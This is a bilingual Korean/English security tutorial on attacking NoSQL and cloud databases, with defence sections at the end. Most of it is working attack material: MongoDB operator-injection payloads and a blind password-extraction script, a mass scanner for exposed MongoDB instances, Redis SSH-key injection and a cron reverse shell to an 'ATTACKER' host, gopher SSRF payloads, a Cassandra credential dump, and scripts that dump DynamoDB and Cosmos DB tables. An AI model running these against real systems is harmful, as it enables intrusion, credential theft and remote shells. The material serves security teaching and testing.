> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# NoSQL 및 클라우드 DB 공격

## 0. 초보자를 위한 개념 이해

### NoSQL이란?

**NoSQL(Not Only SQL)**은 전통적인 관계형 DB(MySQL, Oracle)와 달리 고정된 스키마 없이 다양한 형태의 데이터를 저장하는 DB입니다.

```
관계형 DB (SQL):
  고정 테이블 구조
  Table: users
  +----+--------+----------+
  | id | name   | email    |
  +----+--------+----------+
  | 1  | 홍길동 | hong@... |
  
  → 스키마 변경이 어려움

NoSQL:
  유연한 데이터 구조
  Document (MongoDB):
  {
    "id": 1,
    "name": "홍길동",
    "email": "hong@...",
    "address": {...},   ← 나중에 추가해도 됨
    "tags": ["admin"]   ← 배열도 가능
  }
  
  → 빠른 개발, 확장성 좋음
```

### NoSQL DB 종류

| DB | 데이터 모델 | 주요 사용처 |
|----|------------|------------|
| **MongoDB** | 도큐먼트 (JSON) | 웹 앱, 컨텐츠 관리 |
| **Redis** | 키-값 | 캐시, 세션, 큐 |
| **Cassandra** | 와이드 컬럼 | 대규모 분산 데이터 |
| **Elasticsearch** | 도큐먼트 (검색) | 로그 분석, 검색 엔진 |
| **DynamoDB** | 키-값 + 도큐먼트 | AWS 관리형, 서버리스 |

### NoSQL의 보안 특성

```
SQL 인젝션 vs NoSQL 인젝션:

SQL 인젝션:
  "' OR '1'='1" → SQL 쿼리 조작

NoSQL 인젝션 (MongoDB):
  {"password": {"$ne": null}} → 연산자 주입
  → SQL이 아니라 JSON 파라미터로 조작
  
  MongoDB 연산자들:
  $where  : JavaScript 코드 실행 (매우 위험!)
  $ne     : 같지 않음 (인증 우회에 자주 사용)
  $gt     : 초과
  $regex  : 정규표현식 검색 (ReDoS 가능)
```

**Redis 무인증 접근 위험:**
```
Redis의 기본 설정:
  - 인증 없이 연결 가능
  - 0.0.0.0에 바인딩 (모든 IP)
  - root 계정으로 실행되는 경우 있음
  
결과:
  공격자가 인터넷에서 직접 접속
  CONFIG SET 명령으로 crontab 덮어쓰기
  → OS에서 역방향 쉘 실행
```

---

NoSQL 데이터베이스와 클라우드 관리형 DB는 기존 SQL 인젝션과 다른 공격 벡터를 가진다. MongoDB 연산자 인젝션, Redis 무인증 접근, DynamoDB IAM 설정 오류 등 클라우드 네이티브 환경에서 반복되는 취약점 패턴을 분석한다.

---

## 1. MongoDB 공격

### 1.1 연산자 인젝션

MongoDB는 `$where`, `$gt`, `$ne` 같은 연산자를 JSON 파라미터로 받는다. 입력 검증이 없으면 인증 우회가 가능하다.

```
# 정상 로그인 요청
POST /login
{"username": "admin", "password": "secret"}

# 인젝션: $ne 연산자로 모든 패스워드 우회
POST /login
{"username": "admin", "password": {"$ne": ""}}

# $gt 연산자 변형
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# $regex 연산자로 패스워드 Blind Injection
{"password": {"$regex": "^a"}}   # a로 시작하면 성공
{"password": {"$regex": "^b"}}   # b로 시작하면 성공
```

### 1.2 $where 자바스크립트 인젝션

```javascript
// $where 연산자는 서버 측 JS 실행
db.users.find({$where: "this.username == 'admin'"})

// 인젝션 페이로드 (sleep 기반 시간 측정)
{$where: "sleep(2000) || true"}

// 데이터 추출 (Blind)
{$where: "this.password[0] == 'a'"}
```

```python
#!/usr/bin/env python3
"""MongoDB NoSQL Injection 자동화 테스터"""
import argparse
import string
import time
from typing import Optional

import requests


def test_operator_injection(url: str, username: str) -> bool:
    payload = {"username": username, "password": {"$ne": ""}}
    resp = requests.post(url, json=payload, timeout=5)
    return resp.status_code == 200 and "token" in resp.text


def blind_password_extract(
    url: str, username: str, max_len: int = 32
) -> Optional[str]:
    charset = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for pos in range(max_len):
        found = False
        for ch in charset:
            payload = {
                "username": username,
                "password": {"$regex": f"^{password}{ch}"},
            }
            try:
                resp = requests.post(url, json=payload, timeout=5)
                if resp.status_code == 200 and "token" in resp.text:
                    password += ch
                    found = True
                    break
            except requests.RequestException:
                continue
        if not found:
            break

    return password if password else None


def main() -> None:
    parser = argparse.ArgumentParser(description="MongoDB NoSQL Injection Tester")
    parser.add_argument("url", help="로그인 엔드포인트 URL")
    parser.add_argument("-u", "--username", default="admin")
    parser.add_argument("--extract", action="store_true", help="패스워드 추출 시도")
    args = parser.parse_args()

    if test_operator_injection(args.url, args.username):
        print(f"[+] 연산자 인젝션 성공: {args.username}")
        if args.extract:
            pw = blind_password_extract(args.url, args.username)
            print(f"[+] 추출된 패스워드: {pw}")
    else:
        print("[-] 인젝션 실패 또는 취약점 없음")


if __name__ == "__main__":
    main()
```

### 1.3 Aggregation Pipeline 인젝션

```javascript
// $lookup으로 컬렉션 간 데이터 유출
db.orders.aggregate([
  {$lookup: {
    from: "users",
    localField: "userId",
    foreignField: "_id",
    as: "userInfo"
  }},
  {$project: {"userInfo.password": 1}}
])
```

### 1.4 MongoDB 무인증 접근 스캐너

```python
#!/usr/bin/env python3
"""공개 MongoDB 인스턴스 탐지"""
import argparse
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

import pymongo


def check_mongo(host: str, port: int = 27017, timeout: float = 3.0) -> dict:
    result = {"host": host, "open": False, "dbs": []}
    try:
        client = pymongo.MongoClient(
            host=host,
            port=port,
            serverSelectionTimeoutMS=int(timeout * 1000),
            connectTimeoutMS=int(timeout * 1000),
        )
        result["dbs"] = client.list_database_names()
        result["open"] = True
        client.close()
    except Exception:
        pass
    return result


def scan_range(cidr: str, port: int, workers: int) -> None:
    network = ipaddress.ip_network(cidr, strict=False)
    hosts = [str(h) for h in network.hosts()]

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(check_mongo, h, port): h for h in hosts}
        for future in as_completed(futures):
            res = future.result()
            if res["open"]:
                print(f"[+] {res['host']}:{port} — DBs: {res['dbs']}")


def main() -> None:
    parser = argparse.ArgumentParser(description="MongoDB 무인증 스캐너")
    parser.add_argument("target", help="IP 또는 CIDR (예: 192.168.1.0/24)")
    parser.add_argument("-p", "--port", type=int, default=27017)
    parser.add_argument("-w", "--workers", type=int, default=50)
    args = parser.parse_args()
    scan_range(args.target, args.port, args.workers)


if __name__ == "__main__":
    main()
```

---

## 2. Redis 공격

### 2.1 무인증 Redis 악용

Redis는 기본적으로 인증 없이 모든 명령어를 허용한다. 외부에 노출된 인스턴스는 즉각적인 서버 침해로 이어진다.

```bash
# Redis 기본 포트 접근 확인
redis-cli -h TARGET_IP ping

# 모든 키 덤프
redis-cli -h TARGET_IP keys "*"

# 특정 키 값 조회
redis-cli -h TARGET_IP get session_admin

# 설정 파일 경로 확인
redis-cli -h TARGET_IP config get dir
redis-cli -h TARGET_IP config get dbfilename
```

### 2.2 SSH 인증키 주입 (RCE)

```bash
# Redis 데이터 디렉터리를 ~/.ssh로 변경
redis-cli -h TARGET flushall
redis-cli -h TARGET set payload "\n\nssh-rsa AAAA...공격자공개키...\n\n"
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save

# 이후 SSH 비밀키로 접속
ssh -i attacker_key root@TARGET
```

### 2.3 Cron 기반 리버스 쉘

```bash
# 크론 디렉터리에 리버스 쉘 삽입
redis-cli -h TARGET config set dir /var/spool/cron/crontabs
redis-cli -h TARGET config set dbfilename root
redis-cli -h TARGET set shell "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h TARGET save
```

### 2.4 Redis SSRF 체이닝

```
# Gopher 프로토콜로 Redis 명령어 전송 (SSRF 경유)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# SSRF 요청으로 Redis에 SSH 키 삽입
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0D%0A
```

---

## 3. Apache Cassandra 공격

### 3.1 CQL 인젝션

```python
# 취약한 쿼리 패턴
query = f"SELECT * FROM users WHERE username='{user_input}'"

# 인젝션 페이로드
user_input = "admin' ALLOW FILTERING--"
user_input = "admin' AND token(username) > token('') ALLOW FILTERING--"
```

### 3.2 기본 자격증명 및 설정 오류

```bash
# 기본 자격증명으로 접속
cqlsh TARGET_IP -u cassandra -p cassandra

# 슈퍼유저 목록 확인
SELECT * FROM system_auth.roles WHERE is_superuser = true ALLOW FILTERING;

# 키스페이스 및 테이블 열거
DESCRIBE KEYSPACES;
USE system_auth;
DESCRIBE TABLES;
SELECT username, salted_hash FROM credentials;
```

---

## 4. 클라우드 DB 공격

### 4.1 AWS DynamoDB 공격

```python
#!/usr/bin/env python3
"""DynamoDB IAM 과잉 권한 탐지 및 데이터 열거"""
import argparse

import boto3
from botocore.exceptions import ClientError


def enumerate_tables(session: boto3.Session, region: str) -> list[str]:
    ddb = session.client("dynamodb", region_name=region)
    tables = []
    paginator = ddb.get_paginator("list_tables")
    for page in paginator.paginate():
        tables.extend(page["TableNames"])
    return tables


def dump_table(session: boto3.Session, region: str, table: str, limit: int = 100) -> list[dict]:
    ddb = session.client("dynamodb", region_name=region)
    items = []
    try:
        resp = ddb.scan(TableName=table, Limit=limit)
        items = resp.get("Items", [])
    except ClientError as e:
        print(f"  [-] 접근 거부: {e.response['Error']['Message']}")
    return items


def check_public_access(session: boto3.Session, region: str) -> None:
    ddb = session.client("dynamodb", region_name=region)
    try:
        policies = ddb.describe_resource_policy(ResourceArn="*")
        print(f"[!] 공개 리소스 정책 발견: {policies}")
    except ClientError:
        pass


def main() -> None:
    parser = argparse.ArgumentParser(description="DynamoDB 권한 감사")
    parser.add_argument("--region", default="ap-northeast-2")
    parser.add_argument("--profile", default=None, help="AWS 프로파일명")
    parser.add_argument("--dump", action="store_true", help="테이블 데이터 덤프")
    args = parser.parse_args()

    session = boto3.Session(profile_name=args.profile)
    tables = enumerate_tables(session, args.region)
    print(f"[+] 발견된 테이블 ({len(tables)}개): {tables}")

    if args.dump:
        for table in tables:
            print(f"\n[*] {table} 스캔 중...")
            items = dump_table(session, args.region, table)
            print(f"  [+] {len(items)}개 항목 조회됨")
            for item in items[:3]:
                print(f"    {item}")


if __name__ == "__main__":
    main()
```

### 4.2 Firestore (GCP) 공개 규칙 악용

```javascript
// 취약한 Firestore 보안 규칙
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write;  // 모든 사용자에게 전체 접근 허용 (위험!)
    }
  }
}
```

```python
import firebase_admin
from firebase_admin import credentials, firestore

# 미인증 접근 (공개 규칙인 경우)
import requests

project_id = "target-project"
collection = "users"
url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}"
resp = requests.get(url)
print(resp.json())
```

### 4.3 Azure Cosmos DB 공격

```python
#!/usr/bin/env python3
"""Cosmos DB 연결 문자열 유출 탐지"""
import argparse
import re

from azure.cosmos import CosmosClient


def connect_cosmosdb(connection_string: str) -> CosmosClient:
    return CosmosClient.from_connection_string(connection_string)


def enumerate_cosmos(connection_string: str) -> None:
    client = connect_cosmosdb(connection_string)
    for db in client.list_databases():
        db_client = client.get_database_client(db["id"])
        print(f"[+] DB: {db['id']}")
        for container in db_client.list_containers():
            print(f"  [+] Container: {container['id']}")
            c = db_client.get_container_client(container["id"])
            items = list(c.query_items("SELECT TOP 3 * FROM c", enable_cross_partition_query=True))
            for item in items:
                print(f"    {item}")


def find_connection_strings(text: str) -> list[str]:
    pattern = r"AccountEndpoint=https://[^;]+;AccountKey=[^;]+;"
    return re.findall(pattern, text)


def main() -> None:
    parser = argparse.ArgumentParser(description="Cosmos DB 접근 테스터")
    parser.add_argument("connection_string", help="연결 문자열")
    args = parser.parse_args()
    enumerate_cosmos(args.connection_string)


if __name__ == "__main__":
    main()
```

---

## 5. 방어 및 탐지

### 5.1 NoSQL 인젝션 방어

```python
# 취약한 코드
def login_vulnerable(username: str, password: str) -> bool:
    query = {"username": username, "password": password}
    return db.users.find_one(query) is not None

# 안전한 코드 — 타입 검증 + 허용 문자 제한
import re
from typing import Any

def sanitize_nosql_input(value: Any) -> str:
    if not isinstance(value, str):
        raise ValueError("문자열만 허용")
    if re.search(r'[\$\{\}]', value):
        raise ValueError("허용되지 않은 문자")
    return value

def login_safe(username: str, password: str) -> bool:
    u = sanitize_nosql_input(username)
    p = sanitize_nosql_input(password)
    user = db.users.find_one({"username": u})
    if not user:
        return False
    return verify_bcrypt(p, user["password_hash"])
```

### 5.2 Redis 보안 설정

```bash
# /etc/redis/redis.conf 권장 설정
bind 127.0.0.1              # 로컬 바인딩만
requirepass StrongPassword! # 인증 필수
rename-command FLUSHALL ""  # 위험 명령어 비활성화
rename-command CONFIG ""
rename-command DEBUG ""
protected-mode yes
```

### 5.3 클라우드 DB 모니터링 쿼리 (AWS)

```python
import boto3

def check_dynamodb_encryption(region: str = "ap-northeast-2") -> None:
    ddb = boto3.client("dynamodb", region_name=region)
    paginator = ddb.get_paginator("list_tables")
    for page in paginator.paginate():
        for table in page["TableNames"]:
            desc = ddb.describe_table(TableName=table)["Table"]
            sse = desc.get("SSEDescription", {}).get("Status", "DISABLED")
            pitr = ddb.describe_continuous_backups(TableName=table)
            pitr_status = pitr["ContinuousBackupsDescription"]["PointInTimeRecoveryDescription"]["PointInTimeRecoveryStatus"]
            print(f"{table}: 암호화={sse}, PITR={pitr_status}")
```

---

## 6. 주요 취약점 체크리스트

| 구분 | 항목 | 확인 방법 |
|------|------|----------|
| MongoDB | 무인증 접근 | `mongo TARGET --eval "db.adminCommand({listDatabases:1})"` |
| MongoDB | 연산자 인젝션 | `{"$ne": ""}` 페이로드 테스트 |
| Redis | 외부 노출 | `redis-cli -h TARGET ping` |
| Redis | 위험 명령어 활성화 | `CONFIG GET *` 실행 가능 여부 |
| Cassandra | 기본 계정 | cassandra/cassandra 로그인 시도 |
| DynamoDB | 공개 테이블 | IAM 정책 검토 (`dynamodb:Scan` 공개 여부) |
| Firestore | 공개 규칙 | Firebase 콘솔 보안 규칙 검토 |
| Cosmos DB | 연결 문자열 노출 | 환경 변수, 소스코드, 로그 검색 |

---

<!-- detect-validate-23 -->
## NoSQL/클라우드 DB 공격 탐지와 방어 검증

NoSQL·클라우드 DB 공격은 *어떻게 인증 없는 노출·연산자 주입을 악용하는가*를 다루지만, 방어자는 **각 공격이 클라우드 감사·DB 로그·IAM 어디에 흔적을 남기는가**와 **인증·네트워크 정책이 실제로 노출을 막는가**를 검증해야 한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 공격 | 노리는 계층 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 인증 없는 노출 | 네트워크 경계 | 인증 강제, 방화벽 | 공개 IP 의 DB 포트, 익명 접근 |
| 연산자 주입($ne/$gt) | 쿼리 객체 | 스키마 검증, 타입강제 | `$` 연산자 포함 입력 |
| 과도 IAM 권한 | 클라우드 권한 | 최소권한, 조건부 | 비정상 대량 스캔/내보내기 |
| 스냅샷/백업 탈취 | 저장 데이터 | 암호화, 접근 제한 | 비정상 스냅샷 공유/복사 |

### 방어 검증 (직접 확인)

```bash
# 1) NoSQL 이 인증 없이 노출됐는지 검증(소유 자원) — MongoDB 인증 설정 확인
mongosh --host localhost --quiet --eval "db.adminCommand({getCmdLineOpts:1}).parsed.security" \
  2>/dev/null || echo 'CHECK AUTH — 인증 미설정 의심'
# 2) 클라우드 DB 가 공개 노출됐는지 보안그룹/방화벽 점검(예: 0.0.0.0/0 의 DB 포트)
# (소유 계정의 감사 로그에서 비정상 대량 export/scan 도 함께 확인)
```

> 검증은 반드시 **소유한 DB·클라우드 자원**에서만. "인증/네트워크 정책 설정"과 "실제 노출을 막고 비정상 접근을 경보한다"는 다르다 — 통제 환경에서 노출/주입 PoC 를 재현해 차단·감사를 확인한다([[14_Cloud_Security]], [[13_SOC_Blue_Team]]).

**최신 기법·통제 (2025–2026):**
- NoSQL 인젝션·노출 인스턴스(인증없는 Mongo/Redis)·클라우드 DB 오구성 — 네트워크 격리·인증 강제. 검증: 퍼블릭 노출이 차단되는지 재현(소유 인스턴스)([[14_Cloud_Security]])
- 백업·스냅샷 노출 — 접근통제가 강제되는지 확인

---

<a name="english"></a>

# NoSQL and Cloud DB Attacks

NoSQL databases and cloud-managed DBs have different attack vectors than traditional SQL injection. This section analyzes recurring vulnerability patterns in cloud-native environments including MongoDB operator injection, Redis unauthenticated access, and DynamoDB IAM misconfiguration.

---

## 1. MongoDB NoSQL Injection

```javascript
// Normal login query
db.users.findOne({username: "admin", password: "secret"})

// NoSQL injection with $ne (not equal) operator
// Input: {"username": "admin", "password": {"$ne": ""}}
db.users.findOne({username: "admin", password: {$ne: ""}})
// Returns first user whose password is not empty — auth bypass!

// Other operators
{"$gt": ""}          // Greater than empty string
{"$regex": ".*"}     // Match any string
{"$where": "1==1"}   // JavaScript expression
```

```python
import requests

def test_nosql_injection(login_url: str) -> bool:
    """Test for NoSQL injection in login endpoint"""
    
    payloads = [
        # JSON injection
        {"username": "admin", "password": {"$ne": "invalid"}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        
        # String injection (if JSON not directly used)
        # username=admin&password[$ne]=invalid
    ]
    
    for payload in payloads:
        resp = requests.post(login_url, json=payload, timeout=5)
        if resp.status_code == 200 and "welcome" in resp.text.lower():
            print(f"[!] NoSQL Injection Success: {payload}")
            return True
    
    return False
```

---

## 2. Redis Attacks

```bash
# Redis connection check (no auth)
redis-cli -h TARGET ping
# Response: PONG → connected, no authentication

# List all keys
redis-cli -h TARGET KEYS "*"

# Get all values
redis-cli -h TARGET KEYS "*" | xargs redis-cli -h TARGET MGET

# Check dangerous commands
redis-cli -h TARGET CONFIG GET *
redis-cli -h TARGET CONFIG GET requirepass

# RCE via cron job (if CONFIG SET is available)
redis-cli -h TARGET CONFIG SET dir /var/spool/cron
redis-cli -h TARGET CONFIG SET dbfilename root
redis-cli -h TARGET SET cronjob "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h TARGET BGSAVE

# RCE via SSH key injection
redis-cli -h TARGET CONFIG SET dir /root/.ssh
redis-cli -h TARGET CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET SET attacker_key "\n\nssh-rsa AAAA... attacker@kali\n\n"
redis-cli -h TARGET BGSAVE
```

---

## 3. AWS DynamoDB Security

```python
import boto3
from botocore.exceptions import ClientError

def check_dynamodb_security(region: str = 'us-east-1') -> dict:
    """Check DynamoDB security configuration"""
    
    client = boto3.client('dynamodb', region_name=region)
    findings = []
    
    try:
        # List all tables
        tables = client.list_tables()['TableNames']
        
        for table_name in tables:
            # Check encryption
            desc = client.describe_table(TableName=table_name)['Table']
            
            # Check if server-side encryption is enabled
            sse = desc.get('SSEDescription', {})
            if sse.get('Status') != 'ENABLED':
                findings.append({
                    "table": table_name,
                    "issue": "Server-side encryption not enabled",
                    "severity": "Medium"
                })
            
            # Check for public access via resource policy
            try:
                policy = client.get_resource_policy(ResourceArn=desc['TableArn'])
                # Analyze policy for public access
                import json
                policy_doc = json.loads(policy['Policy'])
                for statement in policy_doc.get('Statement', []):
                    if statement.get('Principal') == '*':
                        findings.append({
                            "table": table_name,
                            "issue": "Table has public resource policy",
                            "severity": "Critical"
                        })
            except ClientError:
                pass  # No resource policy
    
    except ClientError as e:
        return {"error": str(e)}
    
    return {"tables_scanned": len(tables), "findings": findings}
```

---

## 4. Firebase/Firestore Security

```javascript
// Vulnerable Firestore security rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // DANGEROUS: Anyone can read/write!
    }
  }
}

// Secure rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Users can only read/write their own documents
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }
    
    // Public data is read-only
    match /public/{document=**} {
      allow read: if true;
      allow write: if false;
    }
  }
}
```

```bash
# Test Firebase misconfiguration
curl "https://YOUR-PROJECT.firebaseio.com/.json"
# If data returns → publicly accessible without authentication!

# Test Firestore
curl "https://firestore.googleapis.com/v1/projects/YOUR-PROJECT/databases/(default)/documents/users" \
  -H "Content-Type: application/json"
```

---

## 5. NoSQL/Cloud DB Security Checklist

| Database | Vulnerability | Test Method |
|----------|--------------|-------------|
| MongoDB | Unauthenticated access | `mongo TARGET --eval "db.adminCommand({listDatabases:1})"` |
| MongoDB | Operator injection | Test with `{"$ne": ""}` payload |
| Redis | External exposure | `redis-cli -h TARGET ping` |
| Redis | Dangerous commands enabled | Check if `CONFIG GET *` is executable |
| Cassandra | Default credentials | Try cassandra/cassandra login |
| DynamoDB | Public tables | Review IAM policy (`dynamodb:Scan` public?) |
| Firestore | Public rules | Review Firebase Console security rules |
| Cosmos DB | Connection string exposed | Search env vars, source code, logs |

<!-- detect-validate-23 -->
## NoSQL/Cloud DB Attack Detection and Defense Validation

NoSQL/cloud DB attacks describe *how to abuse unauthenticated exposure and operator injection*, but defenders must verify **where each leaves traces (cloud audit, DB logs, IAM)** and **whether auth and network policy actually stop exposure**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Attack | Targeted layer | Primary control (defender) | Detection signal |
|---|---|---|---|
| Unauthenticated exposure | Network boundary | Enforce auth, firewall | DB port on public IP, anonymous access |
| Operator injection ($ne/$gt) | Query object | Schema validation, type enforce | Input containing `$` operators |
| Excessive IAM permission | Cloud permission | Least privilege, conditions | Abnormal bulk scans/exports |
| Snapshot/backup theft | Data at rest | Encryption, access limits | Abnormal snapshot share/copy |

### Defense validation (verify directly)

```bash
# 1) Verify NoSQL is not exposed without auth (own resource) — check MongoDB auth setting
mongosh --host localhost --quiet --eval "db.adminCommand({getCmdLineOpts:1}).parsed.security" \
  2>/dev/null || echo 'CHECK AUTH — auth may be unset'
# 2) Check whether the cloud DB is publicly exposed via security group/firewall (e.g. DB port open to 0.0.0.0/0)
# (also review audit logs in your account for abnormal bulk export/scan)
```

> Validate only on **owned DBs / cloud resources**. "Configured auth/network policy" differs from "actually stops exposure and alerts on abnormal access" — reproduce exposure/injection PoCs in a controlled environment to confirm blocking/auditing ([[14_Cloud_Security]], [[13_SOC_Blue_Team]]).
